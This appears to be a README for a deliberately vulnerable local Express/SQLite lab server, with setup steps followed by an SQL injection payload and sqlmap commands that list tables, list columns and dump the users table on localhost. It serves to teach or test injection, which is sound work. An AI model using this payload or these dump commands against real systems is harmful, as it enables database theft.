## Running the Server

To run the Server, follow these steps:

### Install packages, Express.js, SQLite, base-64, and uuid using npm:

```bash
npm install
```

### Run the server:

```bash
node server.js
```

### Payload

Use the following payloads for testing:

```plaintext
1000 or 1=1 limit 1 offset 1--
```

```
## To list the tables in the database.
sqlmap -u "http://localhost:3000/users?id=1" --dbms=sqlite --tables

## To list the columns in the users table.
sqlmap -u "http://localhost:3000/users?id=1" --dbms=sqlite --columns -T users 

## To dump the data in the users table.
sqlmap -u "http://localhost:3000/users?id=1" --dbms=sqlite --dump -T users 

```

### Detecting 
